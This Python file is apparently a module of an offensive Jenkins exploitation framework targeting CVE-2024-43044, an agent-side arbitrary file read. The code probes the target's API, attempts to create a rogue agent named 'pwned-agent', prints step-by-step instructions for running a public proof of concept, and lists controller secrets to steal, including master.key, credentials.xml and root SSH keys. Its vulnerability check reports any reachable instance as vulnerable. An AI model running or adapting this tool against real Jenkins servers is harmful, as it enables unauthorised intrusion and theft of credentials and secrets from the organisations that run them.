"""
CVE-2024-43044: Jenkins Agent Arbitrary File Read to RCE

In Remoting 3256.v88a_f6e922152 and earlier, calls to Channel#preloadJar result in the
retrieval of files from the controller by the agent using ClassLoaderProxy#fetchJar.
The implementation of ClassLoaderProxy#fetchJar invoked on the controller does not restrict
paths that agents could request to read from the controller file system.

This allows agent processes, code running on agents, and attackers with Agent/Connect
permission to read arbitrary files from the Jenkins controller file system, which can lead
to RCE.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2024-43044"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins Agent Arbitrary File Read to RCE",
    description="Agent can read arbitrary files from controller via ClassLoaderProxy#fetchJar",
    affected_versions=["<= 2.470", "<= 2.452.3 LTS"],
    mitre_attack=["T1190", "T1552.001"],
    severity="critical",
    references=[
        "https://www.jenkins.io/security/advisory/2024-08-07/",
        "https://nvd.nist.gov/vuln/detail/CVE-2024-43044",
        "https://github.com/convisolabs/CVE-2024-43044-jenkins"
    ],
    requires_auth=True,
    requires_crumb=False,
    tags=["file-read", "rce", "agent", "remoting"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/api/json"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            console.print("[yellow][*] NOTE: This exploit requires Agent/Connect permission[/yellow]")
            console.print("[yellow][*] Exploitation requires agent setup or compromised agent[/yellow]")
            return True
        return False
    except Exception as e:
        console.print(f"[red][!] Error checking vulnerability: {e}[/red]")
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2024-43044 for arbitrary file reading from controller via agent.
    
    This exploit requires either:
    1. Agent/Connect permission to create a malicious agent
    2. Code execution on an existing agent
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host (unused for file read)
        lport: Listener port (unused for file read)
        **kwargs: Additional arguments (file_path, agent_name)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Agent Arbitrary File Read)...[/yellow]")
    console.print("[yellow][!] NOTE: This exploit requires Agent/Connect permission or compromised agent[/yellow]")
    
    file_path = kwargs.get('file_path', '/var/jenkins_home/secrets/initialAdminPassword')
    
    console.print(f"[cyan][*] Target file: {file_path}[/cyan]")
    
    console.print("[cyan][*] Checking agent permissions...[/cyan]")
    try:
        computer_url = f"{tool.jenkins_url}/computer/api/json"
        r = requests.get(
            computer_url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code != 200:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details="Unable to access computer/agent API - insufficient permissions"
            )
        
        console.print("[green][+] Agent API accessible[/green]")
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Error accessing agent API: {e}"
        )
    
    console.print()
    console.print("[yellow][!] EXPLOITATION METHODOLOGY:[/yellow]")
    console.print()
    console.print("[cyan]Option 1: Using Public PoC (requires agent setup):[/cyan]")
    console.print("1. Clone: git clone https://github.com/convisolabs/CVE-2024-43044-jenkins")
    console.print("2. Build malicious agent: mvn clean package")
    console.print("3. Create new agent in Jenkins with 'Launch agent by connecting it to the controller'")
    console.print("4. Download agent.jar from Jenkins")
    console.print("5. Run: java -jar CVE-2024-43044.jar -jar agent.jar -secret <SECRET> -url <JENKINS_URL>")
    console.print(f"6. Specify file to read: {file_path}")
    console.print()
    console.print("[cyan]Option 2: Via Groovy Script on Existing Agent:[/cyan]")
    console.print("If you have code execution on an agent, use Groovy script to call:")
    console.print("  hudson.remoting.Channel.current().call(new ClassLoaderProxy.Fetch(jarURL))")
    console.print()
    console.print("[cyan]Option 3: Create Malicious Agent via API:[/cyan]")
    
    agent_name = kwargs.get('agent_name', 'pwned-agent')
    
    console.print(f"[cyan][*] Attempting to check agent creation permissions...[/cyan]")
    try:
        crumb_header = tool.get_crumb()
        headers = {**tool.custom_headers, **crumb_header}
        
        create_agent_url = f"{tool.jenkins_url}/computer/createItem"
        params = {
            'name': agent_name,
            'type': 'hudson.slaves.DumbSlave',
            'mode': 'NORMAL'
        }
        
        r = requests.post(
            create_agent_url,
            params=params,
            auth=tool.auth,
            headers=headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code in [200, 302]:
            console.print(f"[green][+] Agent creation endpoint accessible[/green]")
            console.print(f"[yellow][*] Agent '{agent_name}' may have been created[/yellow]")
            console.print("[yellow][*] Configure the agent and run malicious agent.jar to exploit[/yellow]")
        elif r.status_code == 403:
            console.print("[red][-] Insufficient permissions to create agent[/red]")
        else:
            console.print(f"[yellow][!] Unexpected response: HTTP {r.status_code}[/yellow]")
    
    except Exception as e:
        console.print(f"[red][!] Error testing agent creation: {e}[/red]")
    
    console.print()
    console.print("[yellow][*] CRITICAL FILES TO TARGET:[/yellow]")
    console.print("  - /var/jenkins_home/secrets/initialAdminPassword")
    console.print("  - /var/jenkins_home/secrets/master.key")
    console.print("  - /var/jenkins_home/secrets/hudson.util.Secret")
    console.print("  - /var/jenkins_home/config.xml")
    console.print("  - /var/jenkins_home/credentials.xml")
    console.print("  - /var/jenkins_home/users/*/config.xml")
    console.print("  - /etc/passwd")
    console.print("  - /root/.ssh/id_rsa")
    
    return ExploitResult(
        exploit=CVE_ID,
        status="partial",
        details="Exploitation requires agent setup or compromised agent. See console output for methodology.",
        data={
            "target_file": file_path,
            "public_poc": "https://github.com/convisolabs/CVE-2024-43044-jenkins",
            "agent_api_accessible": True,
            "exploitation_method": "Requires Agent/Connect permission or compromised agent",
            "critical_files": [
                "/var/jenkins_home/secrets/initialAdminPassword",
                "/var/jenkins_home/secrets/master.key",
                "/var/jenkins_home/secrets/hudson.util.Secret",
                "/var/jenkins_home/config.xml",
                "/var/jenkins_home/credentials.xml"
            ]
        }
    )
